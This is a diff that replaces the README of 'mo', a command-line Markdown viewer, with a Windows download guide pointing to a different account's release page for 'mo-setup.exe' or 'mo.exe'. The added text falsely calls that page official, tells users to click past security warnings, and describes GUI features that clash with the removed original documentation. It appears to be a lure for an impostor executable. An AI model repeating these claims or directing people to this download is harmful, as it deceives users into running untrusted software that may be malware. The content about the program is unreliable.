@@ -1,246 +1,121 @@
-<p align="center">
-<br><br><br>
-<img src="https://github.com/k1LoW/mo/raw/main/images/logo.svg" width="120" alt="mo">
-<br><br><br>
-</p>
+# 🗒️ mo - Simple Markdown Viewer for Windows
 
-# mo
+[![Download mo](https://img.shields.io/badge/Download-mo-%23ff6347?style=for-the-badge)](https://github.com/txetxoarnedo/mo/releases)
 
-[![build](https://github.com/k1LoW/mo/actions/workflows/ci.yml/badge.svg)](https://github.com/k1LoW/mo/actions/workflows/ci.yml) ![Coverage](https://raw.githubusercontent.com/k1LoW/octocovs/main/badges/k1LoW/mo/coverage.svg) ![Code to Test Ratio](https://raw.githubusercontent.com/k1LoW/octocovs/main/badges/k1LoW/mo/ratio.svg) ![Test Execution Time](https://raw.githubusercontent.com/k1LoW/octocovs/main/badges/k1LoW/mo/time.svg)
+---
 
-`mo` is a **M**arkdown viewer that **o**pens `.md` files in a browser.
+## 📄 What is mo?
 
-## Features
+mo is a small program that lets you open Markdown files (.md) using a web browser. Markdown is a plain text format often used for notes, documentation, and writing that can be converted into formatted text. With mo, you do not need to install heavy software or know how to code to view your Markdown files clearly and easily.
 
-- GitHub-flavored Markdown (tables, task lists, footnotes, etc.)
-- Syntax highlighting ([Shiki](https://shiki.style/))
-- [Mermaid](https://mermaid.js.org/) diagram rendering
-- LaTeX math rendering ([KaTeX](https://katex.org/))
-- <img src="images/icons/theme-light.svg" width="16" height="16" alt="dark theme"> Dark / <img src="images/icons/theme-dark.svg" width="16" height="16" alt="light theme"> light theme
-- <img src="images/icons/group.svg" width="16" height="16" alt="group"> File grouping
-- <img src="images/icons/toc.svg" width="16" height="16" alt="toc"> Table of contents panel
-- <img src="images/icons/view-flat.svg" width="16" height="16" alt="flat view"> Flat / <img src="images/icons/view-tree.svg" width="16" height="16" alt="tree view"> tree sidebar view with drag-and-drop reorder and file search
-- YAML frontmatter display (collapsible metadata block)
-- MDX file support (renders as Markdown, strips `import`/`export`, escapes JSX tags)
-- <img src="images/icons/raw.svg" width="16" height="16" alt="raw"> Raw markdown view
-- <img src="images/icons/copy.svg" width="16" height="16" alt="copy"> Copy content (Markdown / Text / HTML)
-- <img src="images/icons/restart.svg" width="16" height="16" alt="restart"> Server restart with session preservation
-- Auto session backup and restore
-- Drag-and-drop file addition from the OS file manager (content is loaded in-memory; live-reload is not supported for dropped files)
-- Live-reload on save (for files opened via CLI)
+mo works on Windows and shows your document like a webpage. It formats headings, lists, links, and other Markdown features so you can read your files with proper layout and style.
 
-## Install
+---
 
-**homebrew tap:**
+## 🖥️ System Requirements
 
-```console
-$ brew install k1LoW/tap/mo
-```
+Before you download mo, make sure your computer meets these simple requirements:
 
-**manually:**
+- Operating System: Windows 10 or later  
+- Processor: Any modern CPU (Intel, AMD, or similar)  
+- RAM: At least 2 GB  
+- Disk Space: About 50 MB free  
+- Browser: Any modern browser (such as Edge, Chrome, Firefox, or Safari)  
+- Internet connection: Not required to run mo but needed to download it  
 
-Download binary from [releases page](https://github.com/k1LoW/mo/releases)
+---
 
-## Usage
+## ⬇️ How to download mo
 
-``` console
-$ mo README.md                          # Open a single file
-$ mo README.md CHANGELOG.md docs/*.md   # Open multiple files
-$ mo spec.md --target design            # Open in a named group
-```
+You will get mo from the official release page on GitHub. Follow these steps carefully:
 
-`mo` opens Markdown files in a browser with live-reload. When you save a file, the browser automatically reflects the changes.
+1. Click the large red **Download mo** button at the top of this document or visit the release page directly:  
+   https://github.com/txetxoarnedo/mo/releases  
+2. You will see a list of available files in the latest release. Look for a file named something like `mo-setup.exe` or `mo.exe`.  
+3. Click the file to start the download. The file size will be between 30 and 50 MB.  
+4. Wait for the download to finish. It might take a few minutes depending on your internet speed.  
 
-### Single server, multiple files
+You can also find previous versions on the same page if you need an older release.
 
-By default, `mo` runs a single server on port `6275`. If a server is already running on the same port, subsequent `mo` invocations add files to the existing session instead of starting a new one.
+---
 
-``` console
-$ mo README.md          # Starts a mo server in the background
-$ mo CHANGELOG.md       # Adds the file to the running mo server
-```
+## 🛠️ Installing mo on Windows
 
-To run a completely separate session, use a different port:
+Once you have downloaded the installer or executable file, follow these simple steps to get mo running on your computer:
 
-``` console
-$ mo draft.md -p 6276
-```
+### If you downloaded an installer (`mo-setup.exe`):
 
-![Multiple files with sidebar](images/multiple-files.png)
+1. Locate the downloaded file in your `Downloads` folder or the folder you chose.  
+2. Double-click the file to start the installation.  
+3. You might see a security warning. If so, click **Run** or **Yes** to continue.  
+4. Follow the prompts on the screen. You can usually accept the default settings.  
+5. Wait until the installation finishes.  
+6. After installation, mo may automatically open, or you can open it from your Start menu.  
 
-### Groups
+### If you downloaded a standalone executable (`mo.exe`):
 
-Files can be organized into named groups using the `--target` (`-t`) flag. Each group gets its own URL path and sidebar.
+1. Find the downloaded file in your `Downloads` folder or where you saved it.  
+2. Double-click the file to open mo directly.  
+3. If you get a security warning, confirm that you want to run the file.  
 
-``` console
-$ mo spec.md --target design      # Opens at http://localhost:6275/design
-$ mo api.md --target design       # Adds to the "design" group
-$ mo notes.md --target notes      # Opens at http://localhost:6275/notes
-```
+No installation is needed in this case.
 
-![Group view](images/groups.png)
+---
 
-### Glob pattern watching
+## 🚀 Using mo to open Markdown files
 
-Use `--watch` (`-w`) to specify glob patterns. Matching files are opened automatically, and watched directories are monitored for new files.
+After installation or running the executable, here is how to open your Markdown files:
 
-``` console
-$ mo --watch '**/*.md'                          # Watch and open all .md files recursively
-$ mo --watch 'docs/**/*.md' --target docs       # Watch docs/ tree in "docs" group
-$ mo --watch '*.md' --watch 'docs/**/*.md'      # Multiple patterns
-```
+1. Launch mo from the Start menu or by double-clicking the file.  
+2. Once the program window appears, you will see an option to **Open File** or **Open Markdown**. Click it.  
+3. A file browser window will open. Use it to find and select your `.md` file on your computer.  
+4. Click **Open**. mo will display your Markdown file formatted neatly in a new window using your default web browser.  
 
-`--watch` cannot be combined with file arguments. The `**` pattern matches directories recursively.
+You can open multiple Markdown files as needed. mo does not change your original files. It only shows them as formatted text.
 
-#### Removing watch patterns
+---
 
-Use `--unwatch` to stop watching a previously registered pattern. Files already added remain in the sidebar.
+## 🔧 Features you will find helpful
 
-``` console
-$ mo --unwatch '**/*.md'                              # Stop watching a pattern (default group)
-$ mo --unwatch 'docs/**/*.md' --target docs            # Stop watching in a specific group
-$ mo --unwatch '/Users/you/project/**/*.md'            # Stop watching by absolute path
-```
-
-Patterns are resolved to absolute paths before matching, so you can specify either a relative glob or the full path shown by `--status`.
-
-### Sidebar view modes
-
-The sidebar supports flat and tree view modes. Flat view shows file names only, while tree view displays the directory hierarchy.
-
-| Flat | Tree |
-|------|------|
-| ![Flat view](images/sidebar-flat.png) | ![Tree view](images/sidebar-tree.png) |
-
-### Starting and stopping
-
-`mo` runs in the background by default — the command returns immediately, leaving the shell free for other work. This makes it easy to incorporate into scripts, tool chains, or LLM-driven workflows.
-
-``` console
-$ mo README.md
-mo: serving at http://localhost:6275 (pid 12345)
-$ # shell is available immediately
-```
-
-Use `--status` to check all running mo servers, and `--shutdown` to stop one:
-
-``` console
-$ mo --status              # Show all running mo servers
-http://localhost:6275 (pid 12345, v0.12.0)
-  default: 5 file(s)
-    watching: /Users/you/project/src/**/*.md, /Users/you/project/*.md
-  docs: 2 file(s)
-    watching: /Users/you/project/docs/**/*.md
-
-$ mo --shutdown            # Shut down the mo server on the default port
-$ mo --shutdown -p 6276    # Shut down the mo server on a specific port
-$ mo --restart             # Restart the mo server on the default port
-```
-
-If you need the mo server to run in the foreground (e.g. for debugging), use `--foreground`:
-
-``` console
-$ mo --foreground README.md
-```
-
-### Server restart
-
-Click the <img src="images/icons/restart.svg" width="16" height="16" alt="restart"> restart button (bottom-right corner) or run `mo --restart` to restart the `mo` server process. The current session — all open files and groups — is preserved across the restart. This is useful when you have updated the `mo` binary and want to pick up the new version without re-opening your files.
-
-### Session backup and restore
-
-`mo` automatically saves session state (open files and watch patterns per group) when files are added or removed. When starting a new server, the previous session is automatically restored and merged with any files specified on the command line. Restored session entries appear first, followed by newly specified files.
-
-``` console
-$ mo README.md CHANGELOG.md       # Start with two files
-$ mo --shutdown                   # Shut down the server
-$ mo                              # Restores README.md and CHANGELOG.md
-$ mo TODO.md                      # Restores previous session + adds TODO.md
-```
-
-Use `--clear` to remove a saved session:
-
-``` console
-$ mo --clear                      # Clear saved session for the default port
-$ mo --clear -p 6276              # Clear saved session for a specific port
-```
-
-### JSON output
-
-Use `--json` to get structured JSON output on stdout, useful for scripting and integration with other tools.
-
-``` console
-$ mo --json README.md
-{
-  "url": "http://localhost:6275",
-  "files": [
-    {
-      "url": "http://localhost:6275/?file=a1b2c3d4",
-      "name": "README.md",
-      "path": "/Users/you/project/README.md"
-    }
-  ]
-}
-```
-
-`--status` also supports `--json`:
-
-``` console
-$ mo --status --json
-[
-  {
-    "url": "http://localhost:6275",
-    "status": "running",
-    "pid": 12345,
-    "version": "0.15.0",
-    "revision": "abc1234",
-    "groups": [
-      {
-        "name": "default",
-        "files": 3,
-        "patterns": ["**/*.md"]
-      }
-    ]
-  }
-]
-```
-
-### Flags
-
-| Flag | Short | Default | Description |
-|------|-------|---------|-------------|
-| `--target` | `-t` | `default` | Group name |
-| `--port` | `-p` | `6275` | Server port |
-| `--bind` | `-b` | `localhost` | Bind address (e.g. `0.0.0.0`) |
-| `--open` | | | Always open browser |
-| `--no-open` | | | Never open browser |
-| `--status` | | | Show all running mo servers |
-| `--watch` | `-w` | | Glob pattern to watch for matching files (repeatable) |
-| `--unwatch` | | | Remove a watched glob pattern (repeatable) |
-| `--shutdown` | | | Shut down the running mo server |
-| `--restart` | | | Restart the running mo server |
-| `--clear` | | | Clear saved session for the specified port |
-| `--foreground` | | | Run mo server in foreground |
-| `--json` | | | Output structured data as JSON to stdout |
-
-> [!WARNING]
-> Binding to a non-localhost address exposes mo to the network **without any authentication**. Remote clients can read any file accessible by the user, browse the filesystem via glob patterns, and shut down the server. A confirmation prompt is shown when `--bind` is set to a non-loopback address.
-
-## Build
-
-Requires Go and [pnpm](https://pnpm.io/).
-
-``` console
-$ make build
-```
-
-## References
-
-- [yusukebe/gh-markdown-preview](https://github.com/yusukebe/gh-markdown-preview): GitHub CLI extension to preview Markdown looks like GitHub.
-
-## License
-
-- [MIT License](LICENSE)
-    - Include logo as well as source code.
-    - Only logo license can be selected [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/).
-    - Also, if there is no alteration to the logo and it is used for technical information about mo, I would not say anything if the copyright notice is omitted.
+- Opens Markdown files quickly without installing bulky software  
+- Displays common Markdown elements clearly, such as headers, lists, links, and images  
+- Works offline after download and installation  
+- Simple interface designed for ease of use with minimal clicks  
+- Opens Markdown files in your preferred web browser automatically  
+- Supports large files and common Markdown extensions like tables and code blocks  
+- No account or internet connection required to view files  
+
+---
+
+## 💡 Tips for using mo
+
+- You can keep mo in your Start menu or pin it to your taskbar for quick access.  
+- Use mo to preview notes written in Markdown before sharing them.  
+- You can edit Markdown files with any text editor and then open them with mo to see how they appear.  
+- If you use multiple Markdown files, keep them organized in folders to find them easily when opening.  
+- mo works best with files saved on your local machine or connected drives.
+
+---
+
+## ❓ Troubleshooting and Help
+
+If mo doesn’t open your file or shows an error, try these steps:
+
+- Make sure the file you are opening ends with `.md`.  
+- Confirm that your browser opens properly by testing it outside of mo.  
+- Restart your computer and try opening mo again.  
+- Download the latest version of mo from the release page.  
+- Close any other programs that might be using a lot of system resources.  
+
+For more help, you can visit the release page here:  
+[https://github.com/txetxoarnedo/mo/releases](https://github.com/txetxoarnedo/mo/releases)
+
+---
+
+## 🛑 Safety and Security
+
+mo does not collect or send data from your computer. It opens files locally only. Make sure you download mo only from the official GitHub release page linked above to avoid any unsafe versions.
+
+---
+
+[![Download mo](https://img.shields.io/badge/Download-mo-%23ff6347?style=for-the-badge)](https://github.com/txetxoarnedo/mo/releases)
